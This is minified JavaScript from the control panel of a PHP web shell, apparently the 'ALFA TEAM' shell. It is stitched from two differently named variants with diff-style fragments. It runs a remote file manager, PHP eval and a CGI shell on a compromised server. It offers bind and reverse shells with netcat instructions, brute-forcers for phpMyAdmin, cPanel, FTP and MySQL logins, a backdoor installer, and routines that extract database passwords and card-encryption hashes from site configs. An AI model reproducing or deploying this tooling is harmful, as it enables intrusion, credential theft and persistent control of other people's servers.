saitamaLoadAceEditor(e,a){if(void 0===a&&(a=!1),null==$("saitama-ace-plugin")){var t=document.createElement("script");return t.src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.11/ace.js",t.id="saitama-ace-plugin",t.onload=function(){saitamaLoadAceEditor(e,a)},d.body.appendChild(t),!1}try{"allow"==$(e).getAttribute("mode")&&(a=!1)}catch(e){}if("view_ml_content"==e){null==saitama_ace_editors.editor&&(saitama_ace_editors.editor={});var i=getCookie("saitama_ace_theme_editor"),l=getCookie("saitama_ace_fontsize_editor");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".editor-ace-controller").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=getRandom(10),o=e.querySelector(".view_ml_content");o.setAttribute("id","view_ml_content-"+t),saitama_ace_editors.editor["view_ml_content-"+t]=ace.edit(o),saitama_ace_editors.editor["view_ml_content-"+t].setReadOnly(a),saitama_ace_editors.editor["view_ml_content-"+t].setShowPrintMargin(!1),saitama_ace_editors.editor["view_ml_content-"+t].setTheme("ace/theme/"+i),saitama_ace_editors.editor["view_ml_content-"+t].session.setMode("ace/mode/php"),saitama_ace_editors.editor["view_ml_content-"+t].session.setUseWrapMode(!0),saitama_ace_editors.editor["view_ml_content-"+t].commands.addCommand({name:"save",bindKey:{win:"Ctrl-S",mac:"Cmd-S"},exec:function(e){d.querySelector("#ace-save-btn-"+t).click()}}),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","view_ml_content-"+t),-1!=e.classList.value.indexOf("ace-save-btn")&&e.setAttribute("id","ace-save-btn-"+t)}),void 0!==l&&setTimeout(function(){saitama_ace_editors.editor["view_ml_content-"+t].setFontSize(parseInt(l))},1e3)})}else{null==saitama_ace_editors.eval&&(saitama_ace_editors.eval={});i=getCookie("saitama_ace_theme_eval"),l=getCookie("saitama_ace_fontsize_eval");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".php-evals").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=e.querySelector(".php-evals-ace"),o=getRandom(10);t.setAttribute("id","phpeval-"+o),saitama_ace_editors.eval["phpeval-"+o]=ace.edit(t),saitama_ace_editors.eval["phpeval-"+o].setReadOnly(a),saitama_ace_editors.eval["phpeval-"+o].setShowPrintMargin(!1),saitama_ace_editors.eval["phpeval-"+o].setTheme("ace/theme/"+i),saitama_ace_editors.eval["phpeval-"+o].session.setMode("ace/mode/php"),saitama_ace_editors.eval["phpeval-"+o].session.setUseWrapMode(!0),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","phpeval-"+o)}),void 0!==l&&setTimeout(function(){saitama_ace_editors.eval["phpeval-"+o].setFontSize(parseInt(l))},1e3)})}}function insertToHistory(e,a,t,i){var l="";t&&0!=t&&(l=t);var o=document.createElement("div");o.innerHTML="<div id='"+e+"' class='history' onClick='reopen(this);'><div class='editor-icon'>"+loadType(a,i,e)+"</div><div class='editor-file-name'>"+a+"</div></div><div class='history-close' onClick='removeHistory(\""+e+"\");'>X</div>",o.className="file-holder"+l,o.addEventListener("mouseover",function(){setEditorTitle(e,"over"),this.childNodes[1].style.opacity="1"}),o.addEventListener("mouseout",function(){setEditorTitle(e,"out"),this.childNodes[1].style.opacity="0"});var r=d.getElementsByClassName("history-list")[0];r.insertBefore(o,r.firstChild)}function loadType(e,a,t){"none"==a&&_Ajax(d.URL,"a="+saitamab64("checkfiletype")+"&path="+saitamab64(editor_files[t].pwd)+"&arg="+saitamab64(editor_files[t].file),function(e){$(t).innerHTML="<div class='editor-icon'>"+loadType(editor_files[t].file,e,t)+"</div><div class='editor-file-name'>"+editor_files[t].file+"</div>",editor_files[t].type=e});if("file"==a){a=(a=e.split("."))[a.length-1].toLowerCase();-1==["json","ppt","pptx","xls","xlsx","msi","config","cgi","pm","c","cpp","cs","java","aspx","asp","db","ttf","eot","woff","woff2","woff","conf","log","apk","cab","bz2","tgz","dmg","izo","jar","7z","iso","rar","bat","sh","saitama","gz","tar","php","php4","php5","phtml","html","xhtml","shtml","htm","zip","png","jpg","jpeg","gif","bmp","ico","txt","js","rb","py","xml","css","sql","htaccess","pl","ini","dll","exe","mp3","mp4","m4a","mov","flv","swf","mkv","avi","wmv","mpg","mpeg","dat","pdf","3gp","doc","docx","docm"].indexOf(a)&&(a="notfound")}else a="folder";return'<img src="http://solevisible.com/icons/{type}" width="30" height="30">'.replace("{type}",a+".png")}function updateFileEditor(e,a){var t="id_"+e,i="id_chmode_"+e,l="id_rename_"+e,o="id_touch_"+e,r="id_edit_"+e,n="id_download_"+e,d="id_delete_"+e,s=$(t).getAttribute("ftype");"folder"==s&&(s="dir"),"file"==s?($(t).innerHTML=a,$(t).setAttribute("href","#action=fileman&path="+c_+"/"+a),$(t).setAttribute("onclick","editor('"+a+"','auto','','','','file')"),$(r).setAttribute("onclick","editor('"+a+"','edit','','','','"+s+"')"),$(n).setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')")):($(t).innerHTML="<b>| "+a+" |</b>",$(t).setAttribute("onclick","g('FilesMan', '"+c_+"/"+a+"')")),$(i).setAttribute("onclick","editor('"+a+"','chmod','','','','"+s+"')"),$(l).setAttribute("onclick","editor('"+a+"','rename','','','','"+s+"')"),$(o).setAttribute("onclick","editor('"+a+"','touch','','','','"+s+"')"),$(d).setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';"),$(t).setAttribute("fname",a)}function updateDirsEditor(e,a){var t=d.mf.c.value+"/",i=editor_files[e].pwd+"/"+a+"/",l=editor_files[e].pwd+"/"+editor_files[e].file+"/";for(var o in i=i.replace(/\/\//g,"/"),l=l.replace(/\/\//g,"/"),-1!=(t=t.replace(/\/\//g,"/")).search(i)&&(initDir(t.replace(i,l)),d.mf.c.value=t.replace(i,l)),editor_files){var r=editor_files[o].pwd+"/";-1!=(r=r.replace(/\/\//g,"/")).search(i)&&(editor_files[o].pwd=r.replace(i,l))}updateCookieEditor()}function updateCookieEditor(){setCookie("saitama_history_files",btoa(JSON.stringify(editor_files)),2012)}function setEditorTitle(e,a){if("out"==a&&""!=editor_current_file){var t=d.querySelector(".editor-tab-name.editor-tab-active");e=null!=t?t.getAttribute("opt_id").replace("editor_source_","file_"):editor_current_file}editor_files[e]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[e].pwd+"/"+editor_files[e].file).replace(/\/\//g,"/"))}function removeHistory(e){delete editor_files[e],$(e)&&$(e).parentNode.parentNode.removeChild($(e).parentNode);var a=d.getElementsByClassName("filestools")[0];a&&a.getAttribute("fid")==e&&(a.outerHTML=""),editor_current_file==e&&(editor_current_file=""),updateCookieEditor()}function getRandom(e){for(var a="",t="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",i=void 0===e?20:e;i>0;--i)a+=t[Math.floor(Math.random()*t.length)];return a}function reopen(e){var a=e.getAttribute("id"),t=editor_files[a].pwd,i=editor_files[a].file,l="editor_source_"+a.replace("file_","");null==$(l)?editor(i,"auto","",t,a):editorTabController(l,!0)}function copyToClipboard(e){e=e.getAttribute("ace_id");var a=saitama_ace_editors.editor[e].selection.toJSON();saitama_ace_editors.editor[e].selectAll(),saitama_ace_editors.editor[e].focus(),document.execCommand("copy"),saitama_ace_editors.editor[e].selection.fromJSON(a),saitamaShowNotification("text copied","Editor")}function encrypt(e,a){if(null==a||a.length<=0)return null;e=saitamab64(e,!0),a=saitamab64(a,!0);for(var t="",i="",l=0;l<e.length;)for(var o=0;o<a.length&&(t=e.charCodeAt(l)^a.charCodeAt(o),i+=String.fromCharCode(t),!(++l>=e.length));o++);return saitamab64(i,!0)}function reloadSetting(e){return saitamaloader(saitama_before_do_action_id,"block"),_Ajax(d.URL,"a="+saitamab64("settings")+"&saitama1="+saitamab64(e.protect.value)+"&saitama2="+saitamab64(e.lgpage.value)+"&saitama3="+saitamab64(e.username.value)+"&saitama4="+saitamab64(e.password.value)+"&saitama5="+saitamab64(">>")+"&saitama6="+saitamab64(e.icon.value)+"&saitama7="+saitamab64(e.post_encrypt.value)+"&saitama8="+saitamab64("main")+"&saitama9="+saitamab64(e.cgi_api.value)+"&c="+saitamab64(c_)+"&ajax="+saitamab64("true"),function(e,a){loadPopUpOpTions(a,e),evalJS(e),saitamaloader(a,"none")},!1,saitama_before_do_action_id),saitama_before_do_action_id="",0==e.e.value&&1==e.protect.value&&setTimeout("location.reload()",1e3),e.s.value!=e.icon.value&&setTimeout("location.reload()",1e3),!1}function reloadColors(e){var a={};void 0===e?d.querySelectorAll(".colors_input").forEach(function(e){var t=e.getAttribute("target").replace(".","");a[t]=e.value}):a=e;var t=$("use_default_color").checked?"1":"0";_Ajax(d.URL,"a="+saitamab64("settings")+"&saitama1="+saitamab64(JSON.stringify(a))+"&saitama2="+saitamab64(">>")+"&saitama3="+saitamab64(t)+"&saitama8="+saitamab64("color")+"&c="+saitamab64(c_)+"&ajax="+saitamab64("true"),function(e){evalJS(e)},!0)}function saitamab64(e,a){return void 0!==a||0==post_encryption_mode?window.btoa(unescape(encodeURIComponent(e))):encrypt(e,"<?php echo __saitama_SECRET_KEY__; ?>")}function evalCss(e){var a=document.createElement("style");a.styleSheet?a.styleSheet.cssText=e:a.appendChild(document.createTextNode(e)),d.getElementsByTagName("head")[0].appendChild(a)}function colorHandlerKey(e){setTimeout(function(a){colorHandler(e)},200)}function colorHandler(e){var a=e.getAttribute("target"),t=e.getAttribute("multi"),l=a.indexOf(":hover");if(t){var o=JSON.parse(atob(t)),r="";for(i in o.multi_selector)r+=i+"{"+o.multi_selector[i].replace(/{color}/g,e.value)+"}";evalCss(r)}-1==l||t?($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,".header_values"==a&&(a=".header,.header_values"),d.querySelectorAll(a).forEach(function(a){a.style.color=e.value})):($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,evalCss(a+"{color: "+e.value+";}"))}function importConfig(e){var a=e.target,t=new FileReader;t.onload=function(){var e=t.result;try{reloadColors(JSON.parse(e))}catch(e){alert("Config is invalid...!")}$("importFileBtn").value=""},t.readAsText(a.files[0])}function checkBox(e){var a=saitama_current_fm_id,t=e.checked;d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked=t})}function runcgi(e){if($("cgiframe").style.height="unset",d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Cgi Shell",d.querySelector("#cgiloader .opt-title").innerHTML="Cgi Shell",cgi_is_minimized&&cgi_lang==e&&(showEditor("cgiloader"),0==php_temrinal_using_cgi))return!1;php_temrinal_using_cgi=!1,_Ajax(d.URL,"a="+saitamab64("cgishell")+"&saitama1="+saitamab64(e)+"&ajax="+saitamab64("true"),function(a){d.body.style.overflow="hidden",$("cgiloader").style.display="block",d.querySelector("#cgiframe .terminal-tabs").innerHTML="",d.querySelector("#cgiframe .terminal-contents").innerHTML=a,cgi_lang=e,cgi_is_minimized&&($("cgiloader-minimized").setAttribute("class","minimized-hide"),setTimeout(function(){$("cgiloader").removeAttribute("class"),is_minimized&&($("editor-minimized").style.top="30%")},1e3))})}Element.prototype.appendAfter=function(e){e.parentNode.insertBefore(this,e.nextSibling)};
+var post_encryption_mode = ".(__ALFA_POST_ENCRYPTION__?'true':'false').";";?>
+var alfa1_="",alfa2_="",alfa3_="",alfa4_="",alfa5_="",alfa6_="",alfa7_="",alfa8_="",alfa9_="",alfa10_="",d=document,mysql_cache={},editor_files={},editor_error=!0,editor_current_file="",php_temrinal_using_cgi=!1,is_minimized=!1,cgi_is_minimized=!1,options_window_is_minimized=!1,database_window_is_minimized=!1,rightclick_menu_context=null,can_hashchange_work=!0,alfa_can_add_opt=!1,alfa_before_do_action_id="",alfa_ace_editors={editor:null,eval:null},col_dumper_selected_data={},_ALFA_AJAX_={},cgi_lang="",upcount=1,terminal_walk_index=[],alfa_current_fm_id=1,alfa_fm_id=0;function set(e,a,t,i,l,o,r,n,s,c,f,_,u){d.mf.a.value=null!=e?e:a_,d.mf.c.value=null!=a?a:c_,d.mf.alfa1.value=null!=t?t:"",d.mf.alfa2.value=null!=i?i:"",d.mf.alfa3.value=null!=l?l:"",d.mf.alfa4.value=null!=o?o:"",d.mf.alfa5.value=null!=r?r:"",d.mf.alfa6.value=null!=n?n:"",d.mf.alfa7.value=null!=s?s:"",d.mf.alfa8.value=null!=c?c:"",d.mf.alfa9.value=null!=f?f:"",d.mf.alfa10.value=null!=_?_:"",d.mf.charset.value=null!=u?u:charset_}function fc(e){var a=alfa_current_fm_id,t="a="+alfab64("FilesMan")+"&c="+alfab64(e.c.value)+"&alfa1="+alfab64(e.alfa1.value)+"&ajax="+alfab64("true")+"&",i="",l=0;if(d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked&&(l++,i+="f[]="+alfab64(decodeURIComponent(e.value))+"&")}),0==l&&"paste"!=e.alfa1.value)return!1;switch(alfaloader("filesman_holder_"+a,"block"),e.alfa1.value){case"delete":d.querySelectorAll("#filesman_holder_"+a+" .fmanager-row").forEach(function(e){var a=e.querySelector("input[type=checkbox]");a.checked&&".."!=a.value?e.remove():a.checked=!1}),d.querySelector("#filesman_holder_"+a+" .chkbx").checked=!1;break;case"copy":case"move":case"zip":case"unzip":d.querySelectorAll("#filesman_holder_"+a+" input[type=checkbox]:checked").forEach(function(e){e.checked=!1})}_Ajax(d.URL,t+i,function(e){alfaloader("filesman_holder_"+a,"none"),alfaFmngrContextRow()},!1,"filesman_holder_"+a)}function initDir(e){var a="",t="";islinux&&(a="<a class=\"header_pwd\" onclick=\"g('FilesMan','/');\" path='/' href='#action=fileman&path=/'>/</a>",t="/");var l=e.split("/"),o="",r=islinux?"/":"";for(i in"-1"!=l.indexOf("..")&&(l.splice(l.indexOf("..")-1,1),l.splice(l.indexOf(".."),1)),l)""!=l[i]&&(o+="<a onclick=\"g('FilesMan','"+r+l[i]+"/');\" path='"+r+l[i]+"/' href='#action=fileman&path="+r+l[i]+'/\' class="header_pwd">'+l[i]+"/</a>",r+=l[i]+"/");$("header_cwd").innerHTML=a+o+" ",alfaInitCwdContext(),l=(l=t+l.join("/")).replace("//","/"),d.footer_form.c.value=l,$("footer_cwd").value=l,c_=l}function evalJS(html){var newElement=document.createElement("div");newElement.innerHTML=html;for(var scripts=newElement.getElementsByTagName("script"),i=0;i<scripts.length;++i){var script=scripts[i];eval(script.innerHTML)}}function _Ajax(e,a,t,i,l){var o=!1;return window.XMLHttpRequest?o=new XMLHttpRequest:window.ActiveXObject&&(o=new ActiveXObject("Microsoft.XMLHTTP")),void 0!==l&&(_ALFA_AJAX_[l]=o),o?(o.onreadystatechange=function(){4==o.readyState&&200==o.status?"function"==typeof t&&(t(o.responseText,l),alfaClearAjax(l)):4==o.readyState&&200!=o.status&&(alfaAjaxError(o.status,l,o.statusText,o.responseText),alfaClearAjax(l))},o.open("POST",e,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),void o.send(a)):void alert("Error !")}function alfaClearAjax(e){_ALFA_AJAX_.hasOwnProperty(e)&&delete _ALFA_AJAX_[e]}function handleup(e,a){var t="__fnameup";if(0!=a&&(t="__fnameup"+a),e.files.length>1){for(var i="",l=0;l<e.files.length;l++)i+=e.files[0].name+", ";$(t).innerHTML=i}else e.files[0].name&&($(t).innerHTML=e.files[0].name)}function u(e){var a=!1,t=0,i=alfa_current_fm_id,l=new FormData,o="filesman_holder_"+i;l.append("a",alfab64(e.a.value)),l.append("c",alfab64(e.c.value)),l.append("alfa1",alfab64(e.alfa1.value)),l.append("charset",alfab64(e.charset.value)),l.append("ajax",alfab64(e.ajax.value)),e.querySelectorAll("input[type=file]").forEach(function(e){if(0==e.value.length)return!1;if(e.files.length>1)for(var a=0;a<e.files.length;a++)l.append("f[]",e.files[a]);else l.append("f[]",e.files[0]);t++}),$("footerup").value="",$("__fnameup").innerHTML="";for(var r=1;r<=upcount;r++){var n=$("pfooterup_"+r);n&&n.parentNode.removeChild(n),upcount--}if(0==upcount&&upcount++,0==t)return!1;var s="up_bar_"+getRandom();$("up_bar_holder").insertAdjacentHTML("beforeend","<div id='"+s+"' class='up_bar'></div>");e.c.value;if(window.XMLHttpRequest?a=new XMLHttpRequest:window.ActiveXObject&&(a=new ActiveXObject("Microsoft.XMLHTTP")),a){var c=$(s);_ALFA_AJAX_[s]=a,a.upload&&(c.style.display="block",a.upload.onprogress=function(e){var a=e.position||e.loaded,t=e.totalSize||e.total,i=Math.floor(a/t*1e3)/10+"%";c.style.width=i}),a.onload=function(e){200===a.status?c.style.display="none":alfaAjaxError(a.status,"upload_area",a.statusText,a.responseText),alfaClearAjax(s)},a.onreadystatechange=function(){if(4==a.readyState&&200==a.status){if("noperm"!=a.responseText&&"[]"!=a.responseText){var e,t=JSON.parse(a.responseText),l="",r=d.querySelectorAll("#"+o+" #filemanager_table tr").length-3;for(e in t){++r;var n=t[e].name,s=encodeURIComponent(n),c=t[e].size,f=t[e].perm,_=t[e].modify,u=t[e].owner,p=loadType(n,"file");try{d.querySelector("#"+o+" .fmanager-row a[fname='"+n+"']").parentElement.parentElement.parentElement.remove()}catch(e){}l+='<tr class="fmanager-row" id="tr_row_'+r+'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'+n+'" class="chkbx" id="checkbox'+r+'"><label for="checkbox'+r+'"></label></div></td><td id="td_row_'+r+'">'+p+'<div style="position:relative;display:inline-block;bottom:12px;"><a row="'+r+'" id="id_'+r+'" class="main_name" onclick="editor(\''+s+"','auto','','','','file');\" href=\"#action=fileman&amp;path="+c_+"&amp;file="+s+'" fname="'+n+'" ftype="file" path="'+c_+'" opt_title="">'+n+'</a></div></td><td><span style="font-weight:unset;" class="main_size">'+c+'</span></td><td><span style="font-weight:unset;" class="main_modify">'+_+'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'+u+'</span></td><td><a id="id_chmode_'+r+'" href="javascript:void(0)" onclick="editor(\''+s+"','chmod','','','','file')\">"+f+'</a></td><td><a id="id_rename_'+r+'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'rename','','','','file')\">R</a> <a id=\"id_touch_"+r+'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'touch','','','','file')\">T</a> <a id=\"id_edit_"+r+'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''+s+"', 'edit','','','','file')\">E</a> <a id=\"id_download_"+r+'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''+n+"', 'download')\">D</a><a id=\"id_delete_"+r+'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '+s+" # ?'); chk ? g('FilesMan',null,'delete', '"+s+"') : '';\"> X </a></td></tr>"}d.querySelector("#"+o+" #filemanager_last_tr").insertAdjacentHTML("beforebegin",l),alfaShowNotification("File(s) uploaded successfully","Uploader"),alfaFmngrContextRow()}else alfaShowNotification("Folder has no permission...","Uploader","error");alfaCheckCurrentFilesManTab(i)}},a.open("POST",d.URL),a.send(l)}}function alfaCheckCurrentFilesManTab(e){-1==$("filesman_tab_"+e).classList.value.indexOf("filesman-tab-active")&&$("filesman_tab_"+e).classList.add("tab-is-done")}function g(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset){var fm_id=0==alfa_fm_id?alfa_current_fm_id:alfa_fm_id,fm_id2=alfa_fm_id,fm_path=null==c||0==c.length?c_:c,d_mf_c=fm_path,g_action_id=alfa_before_do_action_id;0==alfa_fm_id&&(set(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset),d_mf_c=d.mf.c.value),"GetConfig"!=a&&"download"!=alfa2&&islinux&&"/"!=d_mf_c.substr(0,1)&&(d_mf_c="/"+d_mf_c),"FilesMan"==a?(alfaloader("filesman_holder_"+fm_id,"block"),g_action_id="filesman_holder_"+fm_id):""!=g_action_id?alfaloader(g_action_id,"block"):"FilesTools"!=a&&"download"!=alfa2&&"GetConfig"!=a&&("sql"==a?(showEditor("database_window"),g_action_id=loadPopUpDatabase("")):"FilesMan"!=a&&(showEditor("options_window"),g_action_id=loadPopUpOpTions(a)),alfaloader(g_action_id,"block"));for(var data="a="+alfab64(a)+"&c="+alfab64(d_mf_c)+"&",i=1;i<=10;i++)data+="alfa"+i+"="+alfab64(eval("d.mf.alfa"+i+".value"))+"&";if("FilesMan"==a){var pagenum=d.querySelector("#"+g_action_id+" .page-number.active-page-number");null!=pagenum&&(data+="pagenum="+alfab64(getCookie(g_action_id+"_page_number")),setCookie(g_action_id+"_page_number",1,2012))}if(data+="&ajax="+alfab64("true"),"FilesTools"==a&&"download"==alfa2){alfaLoaderOnTop("none");var dl=$("dlForm");return dl.a.value=alfab64("dlfile"),dl.c.value=alfab64(d_mf_c),dl.file.value=alfab64(alfa1),void dl.submit()}"GetConfig"!=a?(_Ajax(d.URL,data,function(e,t){evalJS(e);var i=!1;if(alfaLoaderOnTop("none"),"sql"==a)return console.log(t),loadPopUpDatabase(e,t),!1;if("FilesMan"==a){alfaloader("filesman_holder_"+fm_id,"none"),d.querySelector("#filesman_holder_"+fm_id).innerHTML=e,fm_path=fm_path.replace(/\/\//g,"/"),$("filesman_tab_"+fm_id).setAttribute("path",fm_path);var l=alfaGetLastFolderName(fm_path);d.querySelector("#filesman_tab_"+fm_id+" span").innerHTML=l,alfaFmngrContextRow(),"function"==typeof alfa1&&alfa1(e),alfaCheckCurrentFilesManTab(fm_id)}else(options_window_is_minimized||"."==t.substr(0,1))&&"."==t.substr(0,1)&&(i=!0,t=t.substr(1),showEditor("options_window")),i||alfaloader(t,"none"),loadPopUpOpTions(t,e),"phpeval"==a&&alfaLoadAceEditor("PhpCode"),"coldumper"==a.substr(0,9)&&alfaColDumperInit()},!1,""==g_action_id?"."+a:g_action_id),g_action_id="",0==fm_id2&&c!=c_&&c&&initDir(c)):(alfaloader(alfa3,"block"),_Ajax(d.URL,data,function(e,a){var t=a;a=d.querySelector("#"+("id_db"!=a.substr(0,5)?"option_"+a:a));try{(e=JSON.parse(e)).host&&e.user&&e.dbname&&($("db_host")&&(a.querySelector("#db_host").value=e.host),$("db_user")&&(a.querySelector("#db_user").value=e.user),$("db_name")&&(a.querySelector("#db_name").value=e.dbname),$("db_pw")&&(a.querySelector("#db_pw").value=e.password),$("db_prefix")&&e.prefix&&(a.querySelector("#db_prefix").value=e.prefix),$("cc_encryption_hash")&&e.cc_encryption_hash&&(a.querySelector("#cc_encryption_hash").value=e.cc_encryption_hash))}catch(e){}alfaloader(t,"none")},!1,alfa3))}function alfaGetLastFolderName(e){var a=e.replace(/\/\//g,"/").split("/");for(var t in a)0==a[t].length&&a.splice(t,1);var i=a[a.length-1];return 0==i.length&&(i="/"),i}function alfaloader(e,a){if(0==e.length)return!1;try{var t=$("loader_"+e);if(null==t&&"block"==a){var i=null;"editor"==e?i=d.querySelector("#editor .editor-modal"):"id_db"==e.substr(0,5)?i=$(e):"terminal_id"==e.substr(0,11)?i=$(e):"editor"==e.substr(0,6)?i=$(e):"cgiframe"==e?i=$("cgiframe"):"filesman_holder"==e.substr(0,15)?(i=$(e)).style.minHeight="300px":i=$("option_"+e),i.insertAdjacentHTML("afterbegin","<div id='loader_"+e+'\' class="options-loader-holder"><div parent="'+e+'" onclick="alfaAjaxController(this);" class="stopAjax">[ Stop it ]</div><div class="alfateam-loader-text">ALFA TEAM</div><div class="alfa-ajax-error"></div><img src=\'http://solevisible.com/images/loader.svg\'></div>')}else"filesman_holder"==e.substr(0,15)&&($(e).style.minHeight="0"),null!=t&&(t.style.display=a)}catch(e){}}function fs(e){var a=e.getAttribute("db_id"),t=d.querySelector("#"+a+" div.sf");mysql_cache.hasOwnProperty(a)||(mysql_cache[a]={}),alfaloader(a,"block");var i=t.querySelector("input[name=sql_host]").value,l=t.querySelector("input[name=sql_login]").value,o=t.querySelector("input[name=sql_pass]").value,r=t.querySelector("input[name=sql_base]")?t.querySelector("input[name=sql_base]").value:t.querySelector("select[name=sql_base]").value,n=t.querySelector("select[name=type]").value,s=t.querySelector("input[name=sql_count]").checked?"true":"";_Ajax(d.URL,"a="+alfab64("Sql")+"&alfa1="+alfab64("query")+"&alfa2=&c="+alfab64(c_)+"&charset="+alfab64("UTF-8")+"&type="+alfab64(n)+"&sql_host="+alfab64(i)+"&sql_login="+alfab64(l)+"&sql_pass="+alfab64(o)+"&sql_base="+alfab64(r)+"&sql_count="+alfab64(s)+"&current_mysql_id="+alfab64(a)+"&ajax="+alfab64("true"),function(e,a){loadPopUpDatabase(e,a),evalJS(e),alfaloader(a,"none")},!1,a)}function ctlbc(e){var a=$("bcStatus"),t=$("bcipAction");"bind"==e.value?(t.style.display="none",a.innerHTML="<small>Press ` <font color='red'>>></font> ` button and run ` <font color='red'>nc server_ip port</font> ` on your computer</small>"):(t.style.display="inline-block",a.innerHTML="<small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small>")}function $(e){return d.getElementById(e)}function addnewup(){var e="footerup_"+upcount,a="pfooterup_"+upcount,t=1!=upcount?"pfooterup_"+(upcount-1):"pfooterup",i=d.createElement("p");i.innerHTML='<label class="inputfile" for="'+e+'"><span id="__fnameup'+upcount+'"></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id="'+e+'" type="file" name="f[]" onChange="handleup(this,'+upcount+');" multiple>',i.id=a,i.appendAfter($(t)),upcount++}function alfa_searcher_tool(e){switch(e){case"all":case"dirs":_alfaSet(!0,"Disabled");break;case"files":_alfaSet(!1,"php")}}function _alfaSet(e,a){d.srch.ext.disabled=e,d.srch.ext.value=a}function dis_input(e){switch(e){case"phpmyadmin":bruteSet(!0,"Disabled","http://");break;case"direct":bruteSet(!1,"2222","http://");break;case"cp":bruteSet(!1,"2082","http://");break;case"ftp":bruteSet(!0,"Disabled","ftp://");break;case"mysql":bruteSet(!1,"3306","http://");break;case"ftpc":bruteSet(!1,"21","http://")}}function bruteSet(e,a,t){c="21"!=a?"localhost":"ftp.example.com",$("port").disabled=e,$("port").value=a,$("target").value=c,$("protocol").value=t}function inBackdoor(e){"my"==e.value?$("backdoor_textarea").style.display="block":$("backdoor_textarea").style.display="none"}function saveByKey(e){return!("s"==String.fromCharCode(e.which).toLowerCase()&&e.ctrlKey||19==e.which)||($("editor_edit_area").onsubmit(),e.preventDefault(),!1)}function alfaAjaxError(e,a,t,i){if(void 0!==a){var l=d.querySelector("#loader_"+a);null!=l&&(firewall="",403==e&&(firewall=" ~ FireWall Detected!"),l.querySelector("img").remove(),l.querySelector(".alfa-ajax-error").innerHTML=e+" ( "+t+firewall+" )",alfaShowNotification(t,"Ajax","error"))}}function alfaInitCwdContext(){d.querySelectorAll(".header_pwd").forEach(function(e){e.addEventListener("contextmenu",function(e){var a=e.target.getAttribute("path"),t=d.querySelector("#rightclick_menu > a[name=newtab]");t.setAttribute("href","javascript:void(0);"),t.removeAttribute("target"),t.onclick=function(){alfaFilesManNewTab(a,"/")};var i=e.clientX,l=e.clientY;alfaSortMenuItems(["newtab"]),alfaRightClickMenu(i,l),e.preventDefault()})})}function alfaRightClickMenu(e,a){rightclick_menu_context.top=a+"px",rightclick_menu_context.left=e+"px",rightclick_menu_context.visibility="visible",rightclick_menu_context.opacity="1"}function alfaSortMenuItems(e){var a=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete","view_archive"],t=!1;for(var i in a){for(var l in t=!1,e)a[i]!=e[l]||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="block",t=!0);t||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="none")}}function alfaAceChangeSetting(e,a){var t=e.options[e.selectedIndex].value,i=e.getAttribute("base"),l=alfa_ace_editors.editor;"eval"==i&&(l=alfa_ace_editors.eval);var o=e.getAttribute("ace_id");"lang"==a?l[o].session.setMode("ace/mode/"+t):"theme"==a&&l[o].setTheme("ace/theme/"+t),setCookie("alfa_ace_"+a+"_"+i,t,2012)}function alfaAceChangeWrapMode(e,a){var t=alfa_ace_editors.editor;"eval"==a&&(t=alfa_ace_editors.eval);var i=e.getAttribute("ace_id");e.checked?t[i].session.setUseWrapMode(!0):t[i].session.setUseWrapMode(!1)}function alfaAceChangeFontSize(e,a,t){var i=alfa_ace_editors.editor;"eval"==e&&(i=alfa_ace_editors.eval);var l=t.getAttribute("ace_id"),o=i[l].getFontSize();"+"==a?++o:--o,i[l].setFontSize(o),setCookie("alfa_ace_fontsize_"+e,o,2012)}function setCookie(e,a,t){var i=new Date;i.setTime(i.getTime()+24*t*60*60*1e3);var l="expires="+i.toUTCString();document.cookie=e+"="+a+";"+l+";path=/"}function getCookie(e){var a=("; "+document.cookie).split("; "+e+"=");if(2==a.length)return a.pop().split(";").shift()}function editorClose(e){if(d.body.style.overflow="visible",elem=$(e),elem.setAttribute("class","editor-anim-close"),"editor"==e){if(is_minimized=!1,null!=alfa_ace_editors.editor&&null!=alfa_ace_editors.editor){for(var a in alfa_ace_editors.editor)alfa_ace_editors.editor[a].destroy();alfa_ace_editors.editor=null,d.querySelector(".editor-tabs").innerHTML="",d.querySelector(".editor-content-holder").innerHTML=""}}else 